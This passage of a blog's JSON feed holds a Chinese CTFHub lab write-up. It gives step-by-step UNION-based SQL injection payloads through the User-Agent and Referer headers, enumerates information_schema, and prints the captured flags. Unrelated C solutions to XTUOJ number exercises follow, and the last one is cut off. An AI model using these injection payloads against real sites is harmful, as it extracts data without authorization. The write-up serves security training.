data-src=\"https://img-blog.csdnimg.cn/e5801a4321e44cd39def9e7800d321e2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;5b6afeee77278e163c7b8697&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"8ua注入\"><a class=\"anchor\" href=\"#8ua注入\">#</a> 8.UA 注入</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/b8a219f196ff4017a86ed1e8141b5566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n直接抓包，UA 注入<br>\n<img data-src=\"https://img-blog.csdnimg.cn/a10bd5254e7c4f8f860247da496bf6d7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 1. 测试 or,and 等关键字<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 or 1=1</span><br><span class=\"line\">1 or 1=2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/61ff5749cd094d1e9b01521ce3df60a0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and 1=1</span><br><span class=\"line\">1 and 1=2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/0dc8e72ab7a24d089a5b11ae2bc0858c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 经过测试，可以得出 or,and 等关键字没有被过滤</p>\n<p>2. 判断列名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 order by 1,2,3</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/55a3cb52712946a6b8bf012908032c74.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 报错，重来测试一下<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 order by 1,2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/c1796af049b6429ca42835c9e1b4a488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n3. 判断出有两列，接下来判断注入点<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/9a315f7dd31344289a076d0d74c1598b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n4. 知道注入点为 2, 爆库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,database()</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/9fea856ce72b482185b7e198bd477295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n5. 知道库名为 sqli，爆表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/76d25ad459e140b2a60c5dc102f040b7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n6. 得到表名 uztgkqmitp, 爆字段名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;uztgkqmitp&#x27; limit 0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/e2429b9714104ef48ac9dbd25b14e2dc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n7. 知道数据表名为：zecqtvxwmf, 爆字段的内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,(select zecqtvxwmf from uztgkqmitp limit 0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/b8c7c3611dc740139ceecbe4cfe31b22.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;1ae8b024bd884c06f041afd0&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"9refer注入\"><a class=\"anchor\" href=\"#9refer注入\">#</a> 9.refer 注入</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/ef348a7b202344beb14df51fa095a956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n开启 hackbar<br>\n<img data-src=\"https://img-blog.csdnimg.cn/a091f876b84e481091e5654ac30c37e6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n1. 判断 or,and 等的关键字<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 or 1=2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/4faaeefb674e444a8c0218359652222d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and 1=2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/cf11219052de41218191d08e76fff0b1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n2. 确认 or,and 等关键字没被过滤后，使用 order by 判断列名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 order by 1,2,3</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/76fb796d3d5e41b6a81c8224e3795ef2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 使用 3 列，报错<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 order by 1,2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/176375f972014733846b4944079a29de.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n3. 成功回显，说明有两个列名，判断注入点<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/c163c88c432b4ceeab046809843eebd4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n4. 知道注入点为 2 之后，爆库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,database()</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/9a3e3993164544618a8a3c9628538dea.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n5. 知道库名为 sqli，爆表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/d27fdf8fb44d4bb991bf2a87bd28a375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n6. 表名为:fomaihemrb, 爆字段名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;fomaihemrb&#x27; limit 0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/cd8a7bfb20ec4c19b420119d833ac9aa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n7. 知道字段名为:hwgawblkcf, 爆字段的内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,(select hwgawblkcf  from fomaihemrb limit 0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/26a22a8207314f0c9665e9f85c12c406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n8. 得到 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;cd485a3cc106b9a4de4c6e15&#125;</span><br></pre></td></tr></table></figure><br>\n 至此 ctfhub 的 sql 注入基础全部完成<br>\n<img data-src=\"https://img-blog.csdnimg.cn/db1ed3393742495496da9be04d11e237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt></p>\n<h2 id=\"写在最后\"><a class=\"anchor\" href=\"#写在最后\">#</a> 写在最后</h2>\n<p>疯狂星期四，点击下方按钮，V 我 50 吧～～～～～～～</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/10/XTUOJ-1251ColombianNumber/",
            "url": "https://mangpumo.github.io/2022/11/10/XTUOJ-1251ColombianNumber/",
            "title": "XTUOJ_1251ColombianNumber",
            "date_published": "2022-11-10T06:10:52.000Z",
            "content_html": "<h1 id=\"colombian-number\"><a class=\"anchor\" href=\"#colombian-number\">#</a> Colombian Number</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>对于正整数 n, 不存在整数 k, 使得 n 等于 k 加上 k 的数码累加和，我们称这样的数是哥伦比亚数或者自我数。<br>\n比如 11 就不是一个哥伦比亚数，因为 10 加上 10 的数码累加和 1 等于 11; 而 20 则是一个哥伦比亚数。</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>第一行是一个整数 K (K≤10,000)，表示样例的个数。<br>\n以后每行一个正整数 n (1≤n≤1,000,000,000)</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果，如果是哥伦比亚数输出 &quot;Yes&quot;, 否则输出 &quot;No&quot;。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5</span><br><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Yes</span><br><span class=\"line\">No</span><br><span class=\"line\">Yes</span><br><span class=\"line\">Yes</span><br><span class=\"line\">No</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">int colo(int a)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int cnt = a;</span><br><span class=\"line\">    while(a != 0)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cnt += a%10;</span><br><span class=\"line\">        a /= 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return cnt;//数本身+数码累加和</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int K;</span><br><span class=\"line\">    //int flag=1,i;!!!不可以把声明放在样例循环外面</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;K);</span><br><span class=\"line\">    while(K--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        int n;</span><br><span class=\"line\">        int flag=1,i;//声明放在这里</span><br><span class=\"line\">        scanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">        for(i=1;i&lt;=81;i++)//999999999的数码和最高为81</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if(n-i &gt; 0)//暴力解决（顺便解决1的情况）</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                if(colo(n-i) == n)//非哥伦比亚数的数码一定小于数本身（因为要加数码累加和）</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    flag = 0;</span><br><span class=\"line\">                    break;//判断为不是</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            else</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                break;    //暴力后仍未找到，则为哥伦比亚数；</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if(flag == 1)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            printf(&quot;Yes\\n&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            printf(&quot;No\\n&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/10/XTUOJ-1116%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/",
            "url": "https://mangpumo.github.io/2022/11/10/XTUOJ-1116%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/",
            "title": "XTUOJ_1116水仙花数",
            "date_published": "2022-11-10T06:10:19.000Z",
            "content_html": "<h1 id=\"水仙花数\"><a class=\"anchor\" href=\"#水仙花数\">#</a> 水仙花数</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>如果一个 n 位数的每个数位的 n 次方和就是本身，那么我们称这种数为 “水仙花数”。比如 371,3<sup>3+7</sup>3+1^3=27+343+1 = 371。现给你一个数，请求这个数是否是水仙花数。</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>有多组样例。每个样例占一行，为一个整数 a（1&lt;=a &lt;=1,000,000），如果 a 为 0，那么表示输入结束，这个样例不需要处理。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果，如果是就输出 “Yes”，否则输出 “No”。</p>\n<h2 id=\"sample-input\"><a class=\"anchor\" href=\"#sample-input\">#</a> Sample Input</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">600000</span><br><span class=\"line\">700000</span><br><span class=\"line\">0</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"sample-output\"><a class=\"anchor\" href=\"#sample-output\">#</a> Sample Output</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Yes</span><br><span class=\"line\">Yes</span><br><span class=\"line\">Yes</span><br><span class=\"line\">No</span><br><span class=\"line\">No</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">//#include &lt;math.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int n;</span><br><span class=\"line\">    while(scanf(&quot;%d&quot;,&amp;n) != EOF &amp;&amp; n != 0)//不为0</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        int i,j=0,k,temp,n2;</span><br><span class=\"line\">        int len = 0;</span><br><span class=\"line\">        n2 = n;//暂存器</span><br><span class=\"line\">        while(n2&gt;0)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            n2 /= 10;</span><br><span class=\"line\">            len++;//计算位数</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        n2 = n;</span><br><span class=\"line\">        j = 0;//存结果</span><br><span class=\"line\">        while(n2&gt;0)//按位计算</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            k = 1;//方便幂运算</span><br><span class=\"line\">            temp = n2%10;//取位</span><br><span class=\"line\">            for(i=0;i&lt;len;i++)//幂运算</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                k = k*temp;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            n2 /= 10;//去掉用过的位</span><br><span class=\"line\">            j += k;//结果累加</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        /*</span><br><span class=\"line\">        for(i=0;i&lt;len;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            n2 = n2%10;</span><br><span class=\"line\">            temp = (int)pow(n2,len);</span><br><span class=\"line\">            n2 /= 10;</span><br><span class=\"line\">            j = j+temp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        */</span><br><span class=\"line\">        if(j == n)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            printf(&quot;Yes\\n&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            printf(&quot;No\\n&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/10/XTUOJ-1325K-GoodNumber/",
            "url": "https://mangpumo.github.io/2022/11/10/XTUOJ-1325K-GoodNumber/",
            "title": "XTUOJ_1325K-GoodNumber",
            "date_published": "2022-11-10T06:10:06.000Z",
            "content_html": "<h1 id=\"k-good-number\"><a class=\"anchor\" href=\"#k-good-number\">#</a> K-Good Number</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>如果一个整数的二进制（无前导 0）中 1 的个数比 0 的个数多，我们称其为好数。如果其中 1 比 0 多 k 个，我们称其为 k - 好数<br>\n现在给你一个整数，请计算它的 k。</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>第一行一个整数 T (1≤T≤10000)，表示样例的个数。 以后的每行一个整数 x (0≤x≤109)。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果。如果它不是好数，输出 0；否则输出 k。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4</span><br><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">0</span><br><span class=\"line\">2</span><br><span class=\"line\">0</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int T;</span><br><span class=\"line\">    int n=0,i,temp,ans;</span><br><span class=\"line\">    int cnt1=0,cnt2=0;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;T);</span><br><span class=\"line\">    while(T--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cnt1 = 0;//注意初始化</span><br><span class=\"line\">        cnt2 = 0;</span><br><span class=\"line\">        scanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">        while(n != 0)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            temp = 